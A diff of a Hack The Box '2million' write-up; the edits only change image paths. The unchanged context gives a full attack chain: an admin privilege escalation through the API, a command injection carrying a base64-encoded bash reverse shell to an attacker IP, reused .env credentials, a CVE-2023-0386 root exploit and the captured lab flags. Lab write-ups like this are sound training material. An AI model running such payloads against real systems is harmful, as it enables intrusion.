@@ -15,11 +15,11 @@ sticker: emoji//1f47d
 
 Let's investigate the website:
 
-![](cybersecurity/images/Pasted%2520image%252020250106160018.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106160018.png)
 
 We need to add `2million.htb` to `/etc/hosts`:
 
-![](cybersecurity/images/Pasted%2520image%252020250106160136.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106160136.png)
 
 
 
@@ -28,7 +28,7 @@ We need to add `2million.htb` to `/etc/hosts`:
 
 Source code is normal. Let's proceed with some fuzzing in order to find anything useful, we can also answer the first question of the machine:
 
-![](cybersecurity/images/Pasted%2520image%252020250106160426.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106160426.png)
 
 We have 2 TCP open ports.
 
@@ -47,31 +47,31 @@ After trying to fuzz for a while, nothing useful came. Let's skip it for now
 
 Once we go back to the page, we can see there's a login page, let's go into it:
 
-![](cybersecurity/images/Pasted%2520image%252020250106160859.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106160859.png)
 
 Seems like we need some credentials in order to get here, XSS and SQLI does not seem to work in the login page.
 
 But we have another interesting thing in the website, a `join` section, when we click on it, this happens:
 
-![](cybersecurity/images/Pasted%2520image%252020250106161050.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106161050.png)
 
-![](cybersecurity/images/Pasted%2520image%252020250106161104.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106161104.png)
 
 If we take a look at the source code of this page, we find the following:
 
-![](cybersecurity/images/Pasted%2520image%252020250106161218.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106161218.png)
 
 Important things on the code are the following:
 
 ```ad-hint
 1. The script makes a POST request to `/api/v1/invite/verify` in order to check if th invite code is correct
 2. The script is calling another script called `inviteapi.min.js` as shown in the image:
-![](cybersecurity/images/Pasted%2520image%252020250106161417.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106161417.png)
 ```
 
 Let's take a look at the other script:
 
-![](cybersecurity/images/Pasted%2520image%252020250106161442.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106161442.png)
 
 It's obfuscated, let's use chatgpt to deobfuscate the code: 
 
@@ -83,7 +83,7 @@ It's obfuscated, let's use chatgpt to deobfuscate the code:
 
 #### Standard code
 ---
-![](cybersecurity/images/Pasted%2520image%252020250106161725.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106161725.png)
 
 ```
 
@@ -147,30 +147,30 @@ We found another interesting point, another POST request to `/api/v1/invite/how/
 
 #### Output
 ---
-![](cybersecurity/images/Pasted%2520image%252020250106162246.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106162246.png)
 ```
 
 Nice, we got some data, if we check at the encrypted data, we can know it is encrypted using `ROT13`, let's decrypt:
 
-![](cybersecurity/images/Pasted%2520image%252020250106162422.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106162422.png)
 
 We got the way to generate the invite code, we must do a POST request to `/api/v1/invite/generate`, let's use curl again:
 
-![](cybersecurity/images/Pasted%2520image%252020250106162524.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106162524.png)
 
 This is encoded using `base64`, let's decode:
 
-![](cybersecurity/images/Pasted%2520image%252020250106162619.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106162619.png)
 
 So, our invite code would be: `6BA2T-B3C3I-DCYVB-E5SG4`
 
 
-![](cybersecurity/images/Pasted%2520image%252020250106162650.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106162650.png)
 
 Nice! We can now register and also answer some questions:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250106162856.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106162856.png)
 
 Nice, let's proceed with the registration part, let's create a simple account with the following credentials:
 
@@ -186,7 +186,7 @@ password: `password123`
 
 Nice, now we have an initial access:
 
-![](cybersecurity/images/Pasted%2520image%252020250106163234.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106163234.png)
 
 Let's start with the exploitation part.
 
@@ -196,57 +196,57 @@ Let's start with the exploitation part.
 
 Only a few things work in the website, most important one would be the `access` section, which throws this up:
 
-![](cybersecurity/images/Pasted%2520image%252020250106165230.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106165230.png)
 
 This page allows users to download and access a VPN file regarding the HTB infrastructure. Let's open up burp and check the request made by the `Connection Pack` section:
 
-![](cybersecurity/images/Pasted%2520image%252020250106165433.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106165433.png)
 
 We got a request to `/api/v1/user/vpn/generate` if we forward the request, we can download the VPN file. 
 
 Let's try to make a get request to `/api` to check if anything useful comes with it:
 
-![](cybersecurity/images/Pasted%2520image%252020250106165715.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106165715.png)
 
 
 We are getting an unauthorized 401 status code, let's provide our current session cookie and check if anything changes:
 
-![](cybersecurity/images/Pasted%2520image%252020250106165911.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106165911.png)
 
 Nice, we could make the request, let's keep enumerating that api, let's change the request:
 
-![](cybersecurity/images/Pasted%2520image%252020250106170019.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106170019.png)
 
 We can see a bunch of endpoints related to that api, most interesting ones are the admin related ones, let's use our cookie to test how this works:
 
-![](cybersecurity/images/Pasted%2520image%252020250106170213.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106170213.png)
 
 Since the message is false, we know it works, it checked if my cookie relates to a privileged user cookie, we need some sort of way to get admin access exploiting these endpoints:
 
 ```ad-hint
 Let's begin with looking up the `/admin/vpn/generate` endpoint, for this, we will change the request to a post one and use our cookie:
 
-![](cybersecurity/images/Pasted%2520image%252020250106170530.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106170530.png)
 
 We get the same status code as before, we can check the `/admin/settings/update` endpoint which uses a PUT request:
 
-![](cybersecurity/images/Pasted%2520image%252020250106170659.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106170659.png)
 
 It is very interesting, we do not get the same status code as before, this actually tells us something valuable, it is often for APIs to use JSOn for sending and receiving data, let's add a content type header set to json and check again:
-![](cybersecurity/images/Pasted%2520image%252020250106171522.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106171522.png)
 
 It changed! Now it says we are missing the parameter `email`, let's give in our test email we created in the format of json as it will be displayed in the image:
 
-![](cybersecurity/images/Pasted%2520image%252020250106171713.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106171713.png)
 
 Now it says we are missing the `is_admin` parameter, let's set this to true:
-![](cybersecurity/images/Pasted%2520image%252020250106171822.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106171822.png)
 Seems like we need to set it to `1` instead of `true`:
-![](cybersecurity/images/Pasted%2520image%252020250106171912.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106171912.png)
 
 It seems like we were able to escalate into admin user, let's make another call to the `/admin/auth` endpoint to check:
 
-![](cybersecurity/images/Pasted%2520image%252020250106172037.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106172037.png)
 
 And we were right, we were able to escalate into admin user.
 
@@ -259,11 +259,11 @@ Now, our next step would be getting a reverse shell in some way, for this, let's
 
 Since we know that now we have admin access, we can check the `/admin/vpn/generate` endpoint to check what it gives us:
 
-![](cybersecurity/images/Pasted%2520image%252020250106172446.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106172446.png)
 
 Let's put the username:
 
-![](cybersecurity/images/Pasted%2520image%252020250106172628.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106172628.png)
 
 We can see that now we get access to the vpn, this is the data that was given by the endpoint 
 ```
@@ -486,7 +486,7 @@ bfd36c19a809981c06a91882b6800549
 
 Nothing seems really off, but, in case the system is generating this VPN files by using a php function such as `exec` or `system`, we could try [[CYBERSECURITY/CHEATSHEET/COMMAND INJECTION|command injection]], let's test with a simple `id`:
 
-![](cybersecurity/images/Pasted%2520image%252020250106172955.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106172955.png)
 
 That's right, this endpoint is vulnerable to command injection, we can get a reverse shell in the following way:
 
@@ -502,12 +502,12 @@ That's right, this endpoint is vulnerable to command injection, we can get a rev
 
 Sent payload: `curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=lc3vb3f7nhk6krnqls1oc2t93t" --header "Content-Type: application/json" --data '{"username":"testhackerUsername;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zNi80NDQ0IDA+JjE= | base64 -d | bash;"}'`
 
-![](cybersecurity/images/Pasted%2520image%252020250106173523.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106173523.png)
 ```
 
 We got our shell, let's [[CYBERSECURITY/Commands/Shell Tricks/STABLE SHELL.md|stabilize it]]: 
 
-![](cybersecurity/images/Pasted%2520image%252020250106173633.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106173633.png)
 
 Nice, now we have an stable shell!
 
@@ -518,17 +518,17 @@ Nice, now we have an stable shell!
 
 In order to perform privilege escalation, let's begin with a simple enumeration of the `/var/www/html` directory we are currently in:
 
-![](cybersecurity/images/Pasted%2520image%252020250106173802.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106173802.png)
 
 We see a `.env` file, a **`.env` file** is a simple text file used to store environment variables for an application. These files are commonly used in software development to manage configuration settings in a structured and secure way.
 
 Let's read it:
 
-![](cybersecurity/images/Pasted%2520image%252020250106173902.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106173902.png)
 
 Seems like we have an `admin` user in this machine, let's read `/etc/passwd` to check if its true:
 
-![](cybersecurity/images/Pasted%2520image%252020250106174006.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106174006.png)
 
 It is indeed true, now that we know it exists, we can log into ssh using those credentials:
 
@@ -540,20 +540,20 @@ DB_USERNAME=`admin`
 DB_PASSWORD=`SuperDuperPass123`
 ```
 
-![](cybersecurity/images/Pasted%2520image%252020250106174135.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106174135.png)
 
 We are inside ssh, let's check our privileges using `sudo -l`:
 
-![](cybersecurity/images/Pasted%2520image%252020250106174306.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106174306.png)
 
 We can not run sudo with this user, what about `find / -perm -4000 2>/dev/null`:
 
 
-![](cybersecurity/images/Pasted%2520image%252020250106174453.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106174453.png)
 
 We found something really interesting, a `CVE-2023-0386` related file, if we read this CVE, this is what its about:
 
-![](cybersecurity/images/Pasted%2520image%252020250106174601.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106174601.png)
 
 Let's find an exploit for this an execute it:
 
@@ -561,7 +561,7 @@ Let's find an exploit for this an execute it:
 
 Exploit: [exploit](https://github.com/xkaneiki/CVE-2023-0386)
 
-![](cybersecurity/images/Pasted%2520image%252020250106174731.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106174731.png)
 ```
 
 
@@ -582,14 +582,14 @@ I will be using that exploit, let's get it and execute it in the machine in the 
 
 After reproducing all the steps, we get a root shell:
 
-![](cybersecurity/images/Pasted%2520image%252020250106175456.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106175456.png)
 
 
 Now we can read the root flag and the user flag:
 
-![](cybersecurity/images/Pasted%2520image%252020250106175618.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106175618.png)
 
-![](cybersecurity/images/Pasted%2520image%252020250106175639.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106175639.png)
 
 ```ad-note
 root flag: `cca8ef6fecc788f8396049dc9a933d62`
@@ -599,11 +599,11 @@ user flag: `d16ba35dd56db9718ba007fbf1e2f0e4`
 
 Just like that, machine is done, here are all the answers:
 
-![](cybersecurity/images/Pasted%2520image%252020250106180211.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106180211.png)
 
-![](cybersecurity/images/Pasted%2520image%252020250106180236.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106180236.png)
 
-![](cybersecurity/images/Pasted%2520image%252020250106180250.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106180250.png)
 
-![](cybersecurity/images/Pasted%2520image%252020250106180258.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250106180258.png)
 
